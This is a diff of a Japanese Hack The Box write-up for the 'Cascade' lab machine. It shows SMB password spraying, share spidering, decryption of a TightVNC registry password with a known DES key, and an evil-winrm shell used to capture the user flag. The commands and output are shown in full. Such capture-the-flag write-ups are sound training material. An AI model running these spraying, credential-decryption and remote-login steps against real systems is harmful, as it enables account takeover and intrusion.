@@ -1,3 +1,5 @@
+https://app.hackthebox.com/machines/235
+
 ## STEP 1
 ```sh
 └─$ rustscan -a 10.129.188.71 --no-banner --scripts none
@@ -48,20 +50,20 @@ godapでldapを眺めていると謎の属性「cascadeLegacyPwd」を発見
 パスワードスプレーをしたが、ログインできず
 ```sh
 └─$ netexec smb 10.129.188.71 -u user.txt  -p 'Clk0bjVldmE=' --continue-on-success
-SMB         10.129.188.71   445    NONE             [*]  x64 (name:) (domain:) (signing:True) (SMBv1:False) 
-SMB         10.129.188.71   445    NONE             [-] \arksvc:Clk0bjVldmE= STATUS_LOGON_FAILURE 
-SMB         10.129.188.71   445    NONE             [-] \s.smith:Clk0bjVldmE= STATUS_LOGON_FAILURE 
-SMB         10.129.188.71   445    NONE             [-] \r.thompson:Clk0bjVldmE= STATUS_LOGON_FAILURE 
-SMB         10.129.188.71   445    NONE             [-] \util:Clk0bjVldmE= STATUS_LOGON_FAILURE 
-SMB         10.129.188.71   445    NONE             [-] \j.wakefield:Clk0bjVldmE= STATUS_LOGON_FAILURE 
-SMB         10.129.188.71   445    NONE             [-] \s.hickson:Clk0bjVldmE= STATUS_LOGON_FAILURE 
-SMB         10.129.188.71   445    NONE             [-] \j.goodhand:Clk0bjVldmE= STATUS_LOGON_FAILURE 
-SMB         10.129.188.71   445    NONE             [-] \a.turnbull:Clk0bjVldmE= STATUS_LOGON_FAILURE 
-SMB         10.129.188.71   445    NONE             [-] \d.burman:Clk0bjVldmE= STATUS_LOGON_FAILURE 
-SMB         10.129.188.71   445    NONE             [-] \BackupSvc:Clk0bjVldmE= STATUS_LOGON_FAILURE 
-SMB         10.129.188.71   445    NONE             [-] \j.allen:Clk0bjVldmE= STATUS_LOGON_FAILURE
+SMB         10.129.188.71   445    NONE             [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
+SMB         10.129.188.71   445    NONE             [-] cascade.local\arksvc:Clk0bjVldmE= STATUS_LOGON_FAILURE 
+SMB         10.129.188.71   445    NONE             [-] cascade.local\s.smith:Clk0bjVldmE= STATUS_LOGON_FAILURE 
+SMB         10.129.188.71   445    NONE             [-] cascade.local\r.thompson:Clk0bjVldmE= STATUS_LOGON_FAILURE 
+SMB         10.129.188.71   445    NONE             [-] cascade.local\util:Clk0bjVldmE= STATUS_LOGON_FAILURE 
+SMB         10.129.188.71   445    NONE             [-] cascade.local\j.wakefield:Clk0bjVldmE= STATUS_LOGON_FAILURE 
+SMB         10.129.188.71   445    NONE             [-] cascade.local\s.hickson:Clk0bjVldmE= STATUS_LOGON_FAILURE 
+SMB         10.129.188.71   445    NONE             [-] cascade.local\j.goodhand:Clk0bjVldmE= STATUS_LOGON_FAILURE 
+SMB         10.129.188.71   445    NONE             [-] cascade.local\a.turnbull:Clk0bjVldmE= STATUS_LOGON_FAILURE 
+SMB         10.129.188.71   445    NONE             [-] cascade.local\d.burman:Clk0bjVldmE= STATUS_LOGON_FAILURE 
+SMB         10.129.188.71   445    NONE             [-] cascade.local\BackupSvc:Clk0bjVldmE= STATUS_LOGON_FAILURE 
+SMB         10.129.188.71   445    NONE             [-] cascade.local\j.allen:Clk0bjVldmE= STATUS_LOGON_FAILURE
 ```
-しかしパスワードはbase64でデコードされているっぽい  
+しかしパスワードはbase64でエンコードされているっぽい  
 デコードした文字列でパスワードスプレー実施、r.thompsonのログイン成功を確認！
 ```sh
 └─$ echo 'Clk0bjVldmE=' | base64 -d
@@ -94,23 +96,9 @@ LDAP        10.129.188.71   389    CASC-DC1         ArkSvc
 
 
 ## STEP 3
+smb列挙
 ```sh
-└─$ netexec smb 10.129.188.71 -u r.thompson -p rY4n5eva --shares
-SMB         10.129.188.71   445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) 
-SMB         10.129.188.71   445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
-SMB         10.129.188.71   445    CASC-DC1         [*] Enumerated shares
-SMB         10.129.188.71   445    CASC-DC1         Share           Permissions     Remark
-SMB         10.129.188.71   445    CASC-DC1         -----           -----------     ------
-SMB         10.129.188.71   445    CASC-DC1         ADMIN$                          Remote Admin
-SMB         10.129.188.71   445    CASC-DC1         Audit$                          
-SMB         10.129.188.71   445    CASC-DC1         C$                              Default share
-SMB         10.129.188.71   445    CASC-DC1         Data            READ            
-SMB         10.129.188.71   445    CASC-DC1         IPC$                            Remote IPC
-SMB         10.129.188.71   445    CASC-DC1         NETLOGON        READ            Logon server share 
-SMB         10.129.188.71   445    CASC-DC1         print$          READ            Printer Drivers
-SMB         10.129.188.71   445    CASC-DC1         SYSVOL          READ            Logon server share 
-              
-└─$ netexec smb 10.129.188.71 -u r.thompson -p rY4n5eva --share Data -M spider_plus 
+└─$ netexec smb 10.129.188.71 -u r.thompson -p rY4n5eva -M spider_plus 
 SMB         10.129.188.71   445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) 
 SMB         10.129.188.71   445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
 SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] Started module spidering_plus with the following options:
@@ -270,4 +258,100 @@ SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] File size max:        5.
         }
     }
 }
+```
+レジストリがあったのでダウンロード
+```sh
+└─$ netexec smb 10.129.188.71 -u r.thompson -p rY4n5eva --share Data --get-file 'IT/Temp/s.smith/VNC Install.reg' '/home/kali/htb/vnc.reg'
+SMB         10.129.188.71   445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) 
+SMB         10.129.188.71   445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
+SMB         10.129.188.71   445    CASC-DC1         [*] Copying "IT/Temp/s.smith/VNC Install.reg" to "/home/kali/htb/vnc.reg"
+SMB         10.129.188.71   445    CASC-DC1         [+] File "IT/Temp/s.smith/VNC Install.reg" was downloaded to "/home/kali/htb/vnc.reg"
+```
+ファイル名およびレジストリパス名から、vncの設定っぽい
+```sh
+└─$ cat vnc.reg                                                   
+��Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
+"ExtraPorts"=""
+"QueryTimeout"=dword:0000001e
+"QueryAcceptOnTimeout"=dword:00000000
+"LocalInputPriorityTimeout"=dword:00000003
+"LocalInputPriority"=dword:00000000
+"BlockRemoteInput"=dword:00000000
+"BlockLocalInput"=dword:00000000
+"IpAccessControl"=""
+"RfbPort"=dword:0000170c
+"HttpPort"=dword:000016a8
+"DisconnectAction"=dword:00000000
+"AcceptRfbConnections"=dword:00000001
+"UseVncAuthentication"=dword:00000001
+"UseControlAuthentication"=dword:00000000
+"RepeatControlAuthentication"=dword:00000000
+"LoopbackOnly"=dword:00000000
+"AcceptHttpConnections"=dword:00000001
+"LogLevel"=dword:00000000
+"EnableFileTransfers"=dword:00000001
+"RemoveWallpaper"=dword:00000001
+"UseD3D"=dword:00000001
+"UseMirrorDriver"=dword:00000001
+"EnableUrlParams"=dword:00000001
+"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
+"AlwaysShared"=dword:00000000
+"NeverShared"=dword:00000000
+"DisconnectClients"=dword:00000001
+"PollingInterval"=dword:000003e8
+"AllowLoopback"=dword:00000000
+"VideoRecognitionInterval"=dword:00000bb8
+"GrabTransparentWindows"=dword:00000001
+"SaveLogToAllUsersPath"=dword:00000000
+"RunControlInterface"=dword:00000001
+"IdleTimeout"=dword:00000000
+"VideoClasses"=""
+"VideoRects"=""
+```
+パスワードのようなものを発見  
+hexだが、asciiに変換すると文字化けするので暗号化で保護されているっぽい
+```sh
+"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
+```
+decryptできるかググってみると、[リンク](https://github.com/frizb/PasswordDecrypts)を発見  
+リンクどおりのコマンド実行、復号できた
+```sh
+└─$ echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv 
+00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
+00000008
+```
+パスワードスプレー実施、s.smithでログイン成功！
+```sh
+└─$ netexec smb 10.129.188.71 -u user.txt -p sT333ve2 --continue-on-success
+SMB         10.129.188.71   445    NONE             [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
+SMB         10.129.188.71   445    NONE             [-] cascade.local\arksvc:sT333ve2 STATUS_LOGON_FAILURE 
+SMB         10.129.188.71   445    NONE             [+] cascade.local\s.smith:sT333ve2 
+SMB         10.129.188.71   445    NONE             [-] cascade.local\r.thompson:sT333ve2 STATUS_LOGON_FAILURE 
+SMB         10.129.188.71   445    NONE             [-] cascade.local\util:sT333ve2 STATUS_LOGON_FAILURE 
+SMB         10.129.188.71   445    NONE             [-] cascade.local\j.wakefield:sT333ve2 STATUS_LOGON_FAILURE 
+SMB         10.129.188.71   445    NONE             [-] cascade.local\s.hickson:sT333ve2 STATUS_LOGON_FAILURE 
+SMB         10.129.188.71   445    NONE             [-] cascade.local\j.goodhand:sT333ve2 STATUS_LOGON_FAILURE 
+SMB         10.129.188.71   445    NONE             [-] cascade.local\a.turnbull:sT333ve2 STATUS_LOGON_FAILURE 
+SMB         10.129.188.71   445    NONE             [-] cascade.local\d.burman:sT333ve2 STATUS_LOGON_FAILURE 
+SMB         10.129.188.71   445    NONE             [-] cascade.local\BackupSvc:sT333ve2 STATUS_LOGON_FAILURE 
+SMB         10.129.188.71   445    NONE             [-] cascade.local\j.allen:sT333ve2 STATUS_LOGON_FAILURE
+```
+step2でも確認したとおり、s.smithは「Remote Management Users」のメンバーであったためwinrmでログイン成功！  
+ユーザフラグゲット
+```sh
+└─$ evil-winrm -i 10.129.188.71 -u s.smith -p sT333ve2
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\s.smith\Documents> cat ..\Desktop\user.txt
+3ada386a71ef4ab7b28e28765da00829
 ```
